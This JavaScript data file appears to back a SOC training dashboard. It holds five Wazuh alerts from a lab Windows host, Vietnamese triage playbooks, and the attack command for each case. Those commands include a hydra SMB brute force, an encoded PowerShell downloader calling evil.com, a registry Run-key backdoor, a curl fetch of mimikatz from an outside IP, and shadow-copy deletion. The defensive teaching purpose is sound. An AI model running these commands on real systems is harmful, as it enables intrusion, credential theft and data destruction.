const incidentAlerts = [
  {
    id: "ALR-2026-001",
    time: "2026-06-03 14:10:15",
    ruleId: "100001",
    ruleDesc: "Authentication Failure: Multiple SMB logon failures detected (Possible Brute Force)",
    level: 10,
    severity: "High",
    host: "DESKTOP-WIN10-LAB",
    ip: "192.168.208.130",
    srcIp: "192.168.208.145",
    status: "New",
    mitre: "T1110 (Brute Force)",
    sopKey: "sop-smb",
    rawLog: {
      "timestamp": "2026-06-03T14:10:15.123+0700",
      "rule": {
        "id": "100001",
        "level": 10,
        "description": "Authentication Failure: Multiple SMB logon failures detected (Possible Brute Force)",
        "mitre": { "id": ["T1110"] }
      },
      "agent": { "id": "002", "name": "DESKTOP-WIN10-LAB", "ip": "192.168.208.130" },
      "data": {
        "win": {
          "system": {
            "providerName": "Microsoft-Windows-Security-Auditing",
            "eventID": "4625",
            "channel": "Security",
            "computer": "DESKTOP-WIN10-LAB"
          },
          "eventdata": {
            "logonType": "3",
            "logonProcessName": "NtLmSsp",
            "targetUserName": "Administrator",
            "ipAddress": "192.168.208.145",
            "ipPort": "49532",
            "status": "0xC000006D",
            "subStatus": "0xC000006A"
          }
        }
      }
    }
  },
  {
    id: "ALR-2026-002",
    time: "2026-06-03 14:15:30",
    ruleId: "100004",
    ruleDesc: "Defense Evasion: PowerShell execution with encoded command detected",
    level: 10,
    severity: "High",
    host: "DESKTOP-WIN10-LAB",
    ip: "192.168.208.130",
    srcIp: "127.0.0.1",
    status: "New",
    mitre: "T1027 (Obfuscated Files or Information)",
    sopKey: "sop-powershell",
    rawLog: {
      "timestamp": "2026-06-03T14:15:30.456+0700",
      "rule": {
        "id": "100004",
        "level": 10,
        "description": "Defense Evasion: PowerShell execution with encoded command detected",
        "mitre": { "id": ["T1027"] }
      },
      "agent": { "id": "002", "name": "DESKTOP-WIN10-LAB", "ip": "192.168.208.130" },
      "data": {
        "win": {
          "system": {
            "providerName": "Microsoft-Windows-Sysmon",
            "eventID": "1",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer": "DESKTOP-WIN10-LAB"
          },
          "eventdata": {
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "originalFileName": "PowerShell.EXE",
            "commandLine": "powershell.exe -w hidden -ep bypass -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAG0AYQBsAC4AcABzADEAJwApAA==",
            "user": "DESKTOP-WIN10-LAB\\Employee-01",
            "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "parentCommandLine": "cmd.exe"
          }
        }
      }
    }
  },
  {
    id: "ALR-2026-003",
    time: "2026-06-03 14:22:05",
    ruleId: "100003",
    ruleDesc: "Persistence: Suspicious modification of Registry Run Key",
    level: 10,
    severity: "High",
    host: "DESKTOP-WIN10-LAB",
    ip: "192.168.208.130",
    srcIp: "127.0.0.1",
    status: "New",
    mitre: "T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys)",
    sopKey: "sop-registry",
    rawLog: {
      "timestamp": "2026-06-03T14:22:05.789+0700",
      "rule": {
        "id": "100003",
        "level": 10,
        "description": "Persistence: Suspicious modification of Registry Run Key",
        "mitre": { "id": ["T1547.001"] }
      },
      "agent": { "id": "002", "name": "DESKTOP-WIN10-LAB", "ip": "192.168.208.130" },
      "data": {
        "win": {
          "system": {
            "providerName": "Microsoft-Windows-Sysmon",
            "eventID": "12",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer": "DESKTOP-WIN10-LAB"
          },
          "eventdata": {
            "image": "C:\\Windows\\System32\\reg.exe",
            "targetObject": "\\REGISTRY\\USER\\S-1-5-21-3977254193-2720892994-2977432396-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
            "details": "C:\\Windows\\Temp\\updater.exe",
            "user": "DESKTOP-WIN10-LAB\\Employee-01",
            "originalFileName": "reg.exe"
          }
        }
      }
    }
  },
  {
    id: "ALR-2026-004",
    time: "2026-06-03 14:30:40",
    ruleId: "100005",
    ruleDesc: "Suspicious File Download: Executable file created in temporary/public directory",
    level: 11,
    severity: "High",
    host: "DESKTOP-WIN10-LAB",
    ip: "192.168.208.130",
    srcIp: "185.190.140.22",
    status: "New",
    mitre: "T1105 (Ingress Tool Transfer)",
    sopKey: "sop-malware",
    rawLog: {
      "timestamp": "2026-06-03T14:30:40.890+0700",
      "rule": {
        "id": "100005",
        "level": 11,
        "description": "Suspicious File Download: Executable file created in temporary/public directory",
        "mitre": { "id": ["T1105"] }
      },
      "agent": { "id": "002", "name": "DESKTOP-WIN10-LAB", "ip": "192.168.208.130" },
      "data": {
        "win": {
          "system": {
            "providerName": "Microsoft-Windows-Sysmon",
            "eventID": "11",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer": "DESKTOP-WIN10-LAB"
          },
          "eventdata": {
            "image": "C:\\Windows\\System32\\curl.exe",
            "targetFilename": "C:\\Users\\Public\\Downloads\\mimikatz.exe",
            "hashes": "SHA256=a314f6106633fba4b70f9d6ddbee452e8f8f44a72117749c21243dc93c7ed3ac",
            "user": "DESKTOP-WIN10-LAB\\Employee-01",
            "originalFileName": "curl.exe"
          }
        }
      }
    }
  },
  {
    id: "ALR-2026-005",
    time: "2026-06-03 14:45:10",
    ruleId: "100002",
    ruleDesc: "Ransomware Activity: Shadow Copies deletion attempt detected",
    level: 12,
    severity: "Critical",
    host: "DESKTOP-WIN10-LAB",
    ip: "192.168.208.130",
    srcIp: "127.0.0.1",
    status: "New",
    mitre: "T1490 (Inhibit System Recovery)",
    sopKey: "sop-ransomware",
    rawLog: {
      "timestamp": "2026-06-03T14:45:10.512+0700",
      "rule": {
        "id": "100002",
        "level": 12,
        "description": "Ransomware Activity: Shadow Copies deletion attempt detected",
        "mitre": { "id": ["T1490"] }
      },
      "agent": { "id": "002", "name": "DESKTOP-WIN10-LAB", "ip": "192.168.208.130" },
      "data": {
        "win": {
          "system": {
            "providerName": "Microsoft-Windows-Sysmon",
            "eventID": "1",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer": "DESKTOP-WIN10-LAB"
          },
          "eventdata": {
            "image": "C:\\Windows\\System32\\vssadmin.exe",
            "originalFileName": "vssadmin.exe",
            "commandLine": "vssadmin.exe delete shadows /all /quiet",
            "user": "DESKTOP-WIN10-LAB\\Employee-01",
            "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "parentCommandLine": "cmd.exe /c \"C:\\Users\\Employee-01\\AppData\\Local\\Temp\\update.bat\""
          }
        }
      }
    }
  }
];

const playbooks = {
  "sop-smb": {
    title: "SOP-001: Xử lý cảnh báo Brute Force SMB (Event ID 4625)",
    content: `
      <div class="sop-section">
        <h3>1. Triage ban đầu (Triage & Verification)</h3>
        <ul>
          <li>Trích xuất địa chỉ IP nguồn (<code>win.eventdata.ipAddress</code>) và tài khoản bị nhắm mục tiêu (<code>win.eventdata.targetUserName</code>).</li>
          <li>Xác định tần suất: Cảnh báo kích hoạt khi phát hiện hơn 5 lần đăng nhập lỗi trong vòng 60 giây.</li>
        </ul>
      </div>
      <div class="sop-section">
        <h3>2. Phân loại True Positive (TP) / False Positive (FP)</h3>
        <p class="sop-badge fp">False Positive (FP):</p>
        <ul>
          <li>IP nguồn thuộc máy chủ quản trị nội bộ hoặc thiết bị của chính người dùng.</li>
          <li>Tài khoản đăng nhập lỗi là tài khoản hợp lệ của người dùng đó (thường do gõ sai mật khẩu hoặc hết hạn password trên một ứng dụng chạy ngầm).</li>
          <li>Số lượng lần lỗi ít và dừng lại ngay sau đó.</li>
        </ul>
        <p class="sop-badge tp">True Positive (TP):</p>
        <ul>
          <li>IP nguồn là một IP lạ ngoài internet hoặc từ một subnet không có quyền quản lý.</li>
          <li>Đăng nhập liên tục vào nhiều tài khoản khác nhau hoặc tập trung dò quét tài khoản mặc định (như <code>Administrator</code>, <code>root</code>, <code>guest</code>).</li>
          <li>Hàng chục/hàng trăm Event ID 4625 diễn ra liên tục không có dấu hiệu dừng lại.</li>
        </ul>
      </div>
      <div class="sop-section">
        <h3>3. Phương án ngăn chặn & xử lý (Containment & Remediation)</h3>
        <ul>
          <li><strong>Ngăn chặn nguồn:</strong> Kiểm tra xem Wazuh Active Response có kích hoạt block IP đó qua tường lửa chưa. Nếu chưa, tạo luật chặn IP nguồn thủ công trên Firewall.</li>
          <li><strong>Kiểm tra thành công:</strong> Thực hiện truy vấn Event ID 4624 (Đăng nhập thành công) từ cùng IP nguồn đó để kiểm tra xem kẻ tấn công đã dò thành công mật khẩu hay chưa.</li>
          <li><strong>Xử lý tài khoản:</strong> Nếu có đăng nhập thành công từ IP tấn công, lập tức vô hiệu hóa tài khoản (Disable account), thu hồi toàn bộ session đang hoạt động và yêu cầu đổi mật khẩu ngay lập tức.</li>
        </ul>
      </div>
    `
  },
  "sop-powershell": {
    title: "SOP-002: Xử lý cảnh báo PowerShell Encoded Command (Sysmon ID 1)",
    content: `
      <div class="sop-section">
        <h3>1. Triage ban đầu (Triage & Verification)</h3>
        <ul>
          <li>Trích xuất chuỗi mã hóa Base64 trong lệnh PowerShell (<code>win.eventdata.commandLine</code>).</li>
          <li>Sử dụng module PowerShell Decoder để giải mã chuỗi Base64 UTF-16LE sang mã rõ.</li>
          <li>Xác định tiến trình cha (<code>parentImage</code>) đã khởi chạy lệnh PowerShell này.</li>
        </ul>
      </div>
      <div class="sop-section">
        <h3>2. Phân loại True Positive (TP) / False Positive (FP)</h3>
        <p class="sop-badge fp">False Positive (FP):</p>
        <ul>
          <li>Các script quản trị hệ thống hợp lệ được đóng gói Base64 bởi các công cụ quản lý CNTT (như SCCM, Kaspersky Agent, hoặc Active Directory Group Policy).</li>
          <li>Tiến trình cha là một tiến trình quản trị an toàn đã được xác minh.</li>
        </ul>
        <p class="sop-badge tp">True Positive (TP):</p>
        <ul>
          <li>Mã rõ sau khi giải chứa các từ khóa nguy hiểm tải file (<code>Invoke-WebRequest</code>, <code>DownloadFile</code>) hoặc thực thi trực tiếp bộ nhớ (<code>IEX</code>, <code>Invoke-Expression</code>).</li>
          <li>Tiến trình cha là các phần mềm văn phòng (<code>Word</code>, <code>Excel</code>), trình duyệt web, hoặc các file thực thi chạy từ thư mục tạm (<code>Temp</code>, <code>Downloads</code>, <code>Public</code>).</li>
        </ul>
      </div>
      <div class="sop-section">
        <h3>3. Phương án ngăn chặn & xử lý (Containment & Remediation)</h3>
        <ul>
          <li><strong>Cách ly máy chủ:</strong> Sử dụng chức năng cách ly thiết bị (Isolate Host) nếu xác định lệnh PowerShell đã tải thành công và thực thi mã độc.</li>
          <li><strong>Ngắt tiến trình:</strong> Chấm dứt (Kill) tiến trình PowerShell đang chạy ngầm và tiến trình cha đã gọi nó.</li>
          <li><strong>Thu thập mẫu:</strong> Lấy tệp mã độc tải về (nếu có) để tiến hành phân tích mã độc sâu hơn.</li>
        </ul>
      </div>
    `
  },
  "sop-registry": {
    title: "SOP-003: Xử lý cảnh báo Ghi Registry Run Key (Sysmon ID 12/13)",
    content: `
      <div class="sop-section">
        <h3>1. Triage ban đầu (Triage & Verification)</h3>
        <ul>
          <li>Xác định khóa Registry bị chỉnh sửa (<code>win.eventdata.targetObject</code>).</li>
          <li>Xác định giá trị đường dẫn tệp được cấu hình khởi động cùng hệ thống (<code>win.eventdata.details</code>).</li>
          <li>Xác định tiến trình thực hiện sửa đổi (<code>win.eventdata.image</code>).</li>
        </ul>
      </div>
      <div class="sop-section">
        <h3>2. Phân loại True Positive (TP) / False Positive (FP)</h3>
        <p class="sop-badge fp">False Positive (FP):</p>
        <ul>
          <li>Phần mềm nghiệp vụ hợp lệ do người dùng hoặc quản trị viên cài đặt tạo Run Key khởi động cùng Windows (ví dụ: Zalo, Slack, Chrome, Onedrive).</li>
          <li>Đường dẫn tệp trỏ đến thư mục cài đặt tiêu chuẩn (<code>C:\\Program Files\\...</code>).</li>
        </ul>
        <p class="sop-badge tp">True Positive (TP):</p>
        <ul>
          <li>Khóa Registry trỏ đến một tệp thực thi lạ nằm trong thư mục tạm như <code>C:\\Users\\Public\\</code>, <code>C:\\Windows\\Temp\\</code>, hoặc <code>AppData\\Local\\Temp\\</code>.</li>
          <li>Tiến trình thực hiện ghi là một tiến trình lạ hoặc chạy các dòng lệnh cmd/powershell ngầm để thiết lập cơ chế duy trì quyền truy cập (Persistence).</li>
        </ul>
      </div>
      <div class="sop-section">
        <h3>3. Phương án ngăn chặn & xử lý (Containment & Remediation)</h3>
        <ul>
          <li><strong>Dọn dẹp Registry:</strong> Xóa bỏ khóa Registry đáng ngờ vừa tạo để tránh mã độc khởi chạy lại khi khởi động máy.</li>
          <li><strong>Xóa tệp mã độc:</strong> Xác định và xóa bỏ tệp thực thi được trỏ tới trong Registry Run Key đó.</li>
          <li><strong>Quét hệ thống:</strong> Kích hoạt trình quét mã độc Full Scan trên Endpoint để đảm bảo không còn thành phần lưu vết nào khác.</li>
        </ul>
      </div>
    `
  },
  "sop-malware": {
    title: "SOP-004: Xử lý cảnh báo Tải file độc hại (Sysmon ID 11 / VT Integration)",
    content: `
      <div class="sop-section">
        <h3>1. Triage ban đầu (Triage & Verification)</h3>
        <ul>
          <li>Xác định vị trí tệp tải về (<code>win.eventdata.targetFilename</code>).</li>
          <li>Lấy giá trị Hash (SHA256) của tệp và kiểm tra độ uy tín trên VirusTotal.</li>
          <li>Xác định tiến trình đã tải tệp xuống (như <code>curl.exe</code>, <code>powershell.exe</code>, trình duyệt web).</li>
        </ul>
      </div>
      <div class="sop-section">
        <h3>2. Phân loại True Positive (TP) / False Positive (FP)</h3>
        <p class="sop-badge fp">False Positive (FP):</p>
        <ul>
          <li>Quản trị viên tải các công cụ quản trị hệ thống, công cụ IT Support bị Antivirus nhận diện nhầm.</li>
          <li>Hoạt động kiểm thử bảo mật (Pentest) đã được phê duyệt trước đó trong tổ chức.</li>
        </ul>
        <p class="sop-badge tp">True Positive (TP):</p>
        <ul>
          <li>Tệp tải về là công cụ tấn công nổi tiếng (như <code>mimikatz.exe</code>, <code>ncat.exe</code>, backdoor) được đặt trong các thư mục tạm.</li>
          <li>Tỉ lệ nhận diện trên VirusTotal cao (> 5/70 công cụ bảo mật đánh giá độc hại).</li>
        </ul>
      </div>
      <div class="sop-section">
        <h3>3. Phương án ngăn chặn & xử lý (Containment & Remediation)</h3>
        <ul>
          <li><strong>Cô lập file:</strong> Xóa ngay tệp tin độc hại vừa tải xuống khỏi hệ thống.</li>
          <li><strong>Kiểm tra thực thi:</strong> Rà soát log Sysmon Event ID 1 xem tệp tin độc hại đó đã từng được thực thi trên máy chưa.</li>
          <li><strong>Cách ly Endpoint:</strong> Nếu tệp đã chạy và sinh kết nối mạng ra ngoài, thực hiện cách ly máy chủ khẩn cấp.</li>
        </ul>
      </div>
    `
  },
  "sop-ransomware": {
    title: "SOP-005: Xử lý cảnh báo Xóa Shadow Copy (Event ID 1 - vssadmin.exe)",
    content: `
      <div class="sop-section">
        <h3>1. Triage ban đầu (Triage & Verification)</h3>
        <ul>
          <li>Xác định câu lệnh thực thi (<code>win.eventdata.commandLine</code>). Điển hình là: <code>vssadmin delete shadows</code> hoặc <code>wmic shadowcopy delete</code>.</li>
          <li>Xác định tài khoản thực thi và tiến trình cha đã gọi nó.</li>
        </ul>
      </div>
      <div class="sop-section">
        <h3>2. Phân loại True Positive (TP) / False Positive (FP)</h3>
        <p class="sop-badge fp">False Positive (FP):</p>
        <ul>
          <li>Các script dọn dẹp hệ thống, script sao lưu (Backup) tự động do IT Admin cấu hình chạy định kỳ để giải phóng không gian ổ đĩa.</li>
        </ul>
        <p class="sop-badge tp">True Positive (TP):</p>
        <ul>
          <li>Lệnh xóa shadow copy được gọi ngay sau các cảnh báo xâm nhập khác (như tải file lạ, thực thi PowerShell mã hóa).</li>
          <li>Tiến trình cha là một tiến trình đáng ngờ hoặc không rõ nguồn gốc. Đây là hành vi chuẩn bị mã hóa dữ liệu của Ransomware để ngăn nạn nhân khôi phục file.</li>
        </ul>
      </div>
      <div class="sop-section">
        <h3>3. Phương án ngăn chặn & xử lý (Containment & Remediation)</h3>
        <ul>
          <li><strong>CÁCH LY KHẨN CẤP:</strong> Thực hiện cách ly mạng của Endpoint ngay lập tức để ngăn Ransomware lây lan sang các phân vùng mạng khác.</li>
          <li><strong>Kill Process:</strong> Kết thúc ngay lập tức tiến trình cha đang thực thi lệnh xóa shadow và mã hóa file.</li>
          <li><strong>Bảo vệ backup:</strong> Kiểm tra và bảo vệ các bản sao lưu offline hoặc bản lưu trữ trên cloud.</li>
        </ul>
      </div>
    `
  }
};

const eventGenData = {
  "gen-smb": {
    title: "Use Case 1: SMB Brute Force Attack",
    cmd: "hydra -l administrator -P passwords.txt smb://192.168.208.130",
    log: {
      "timestamp": "2026-06-03T14:10:15.123+0700",
      "rule": {
        "id": "100001",
        "level": 10,
        "description": "Authentication Failure: Multiple SMB logon failures detected (Possible Brute Force)",
        "mitre": { "id": ["T1110"] }
      },
      "agent": { "id": "002", "name": "DESKTOP-WIN10-LAB", "ip": "192.168.208.130" },
      "data": {
        "win": {
          "system": {
            "providerName": "Microsoft-Windows-Security-Auditing",
            "eventID": "4625",
            "channel": "Security",
            "computer": "DESKTOP-WIN10-LAB"
          },
          "eventdata": {
            "logonType": "3",
            "logonProcessName": "NtLmSsp",
            "targetUserName": "Administrator",
            "ipAddress": "192.168.208.145",
            "ipPort": "49532",
            "status": "0xC000006D",
            "subStatus": "0xC000006A"
          }
        }
      }
    }
  },
  "gen-powershell": {
    title: "Use Case 2: Encoded PowerShell Downloader",
    cmd: "powershell.exe -w hidden -ep bypass -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAG0AYQBsAC4AcABzADEAJwApAA==",
    log: {
      "timestamp": "2026-06-03T14:15:30.456+0700",
      "rule": {
        "id": "100004",
        "level": 10,
        "description": "Defense Evasion: PowerShell execution with encoded command detected",
        "mitre": { "id": ["T1027"] }
      },
      "agent": { "id": "002", "name": "DESKTOP-WIN10-LAB", "ip": "192.168.208.130" },
      "data": {
        "win": {
          "system": {
            "providerName": "Microsoft-Windows-Sysmon",
            "eventID": "1",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer": "DESKTOP-WIN10-LAB"
          },
          "eventdata": {
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "originalFileName": "PowerShell.EXE",
            "commandLine": "powershell.exe -w hidden -ep bypass -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAG0AYQBsAC4AcABzADEAJwApAA==",
            "user": "DESKTOP-WIN10-LAB\\Employee-01",
            "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "parentCommandLine": "cmd.exe"
          }
        }
      }
    }
  },
  "gen-registry": {
    title: "Use Case 3: Registry Run Key Persistence",
    cmd: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"C:\\Windows\\Temp\\updater.exe\" /f",
    log: {
      "timestamp": "2026-06-03T14:22:05.789+0700",
      "rule": {
        "id": "100003",
        "level": 10,
        "description": "Persistence: Suspicious modification of Registry Run Key",
        "mitre": { "id": ["T1547.001"] }
      },
      "agent": { "id": "002", "name": "DESKTOP-WIN10-LAB", "ip": "192.168.208.130" },
      "data": {
        "win": {
          "system": {
            "providerName": "Microsoft-Windows-Sysmon",
            "eventID": "12",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer": "DESKTOP-WIN10-LAB"
          },
          "eventdata": {
            "image": "C:\\Windows\\System32\\reg.exe",
            "targetObject": "\\REGISTRY\\USER\\S-1-5-21-3977254193-2720892994-2977432396-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
            "details": "C:\\Windows\\Temp\\updater.exe",
            "user": "DESKTOP-WIN10-LAB\\Employee-01",
            "originalFileName": "reg.exe"
          }
        }
      }
    }
  },
  "gen-malware": {
    title: "Use Case 4: Suspicious File Download",
    cmd: "curl -o C:\\Users\\Public\\Downloads\\mimikatz.exe http://185.190.140.22/mimikatz.exe",
    log: {
      "timestamp": "2026-06-03T14:30:40.890+0700",
      "rule": {
        "id": "100005",
        "level": 11,
        "description": "Suspicious File Download: Executable file created in temporary/public directory",
        "mitre": { "id": ["T1105"] }
      },
      "agent": { "id": "002", "name": "DESKTOP-WIN10-LAB", "ip": "192.168.208.130" },
      "data": {
        "win": {
          "system": {
            "providerName": "Microsoft-Windows-Sysmon",
            "eventID": "11",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer": "DESKTOP-WIN10-LAB"
          },
          "eventdata": {
            "image": "C:\\Windows\\System32\\curl.exe",
            "targetFilename": "C:\\Users\\Public\\Downloads\\mimikatz.exe",
            "hashes": "SHA256=a314f6106633fba4b70f9d6ddbee452e8f8f44a72117749c21243dc93c7ed3ac",
            "user": "DESKTOP-WIN10-LAB\\Employee-01",
            "originalFileName": "curl.exe"
          }
        }
      }
    }
  },
  "gen-ransomware": {
    title: "Use Case 5: Shadow Copies Deletion",
    cmd: "vssadmin.exe delete shadows /all /quiet",
    log: {
      "timestamp": "2026-06-03T14:45:10.512+0700",
      "rule": {
        "id": "100002",
        "level": 12,
        "description": "Ransomware Activity: Shadow Copies deletion attempt detected",
        "mitre": { "id": ["T1490"] }
      },
      "agent": { "id": "002", "name": "DESKTOP-WIN10-LAB", "ip": "192.168.208.130" },
      "data": {
        "win": {
          "system": {
            "providerName": "Microsoft-Windows-Sysmon",
            "eventID": "1",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer": "DESKTOP-WIN10-LAB"
          },
          "eventdata": {
            "image": "C:\\Windows\\System32\\vssadmin.exe",
            "originalFileName": "vssadmin.exe",
            "commandLine": "vssadmin.exe delete shadows /all /quiet",
            "user": "DESKTOP-WIN10-LAB\\Employee-01",
            "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "parentCommandLine": "cmd.exe /c \"C:\\Users\\Employee-01\\AppData\\Local\\Temp\\update.bat\""
          }
        }
      }
    }
  }
};
